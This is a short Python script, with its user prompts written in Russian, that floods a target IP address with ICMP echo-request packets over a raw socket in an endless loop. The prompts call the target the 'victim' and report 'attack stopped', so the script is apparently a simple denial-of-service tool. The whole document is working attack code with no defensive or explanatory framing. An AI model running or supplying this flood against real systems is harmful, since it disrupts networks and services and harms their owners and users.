import socket
import sys


def main():
    if len(sys.argv) != 2:
        print("Введите адрес жертвы")
        sys.exit(1)
    target_ip = sys.argv[1]
    icmp_packet = b'\x08\x00\xf7\xff\x00\x00\x00\x00'
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        while True:
            sock.sendto(icmp_packet, (target_ip, 0))
    except KeyboardInterrupt:
        print("Атака остановлена.")
    except Exception as e:
        print(f"Ошибка: {e}")


if __name__ == "__main__":
    main()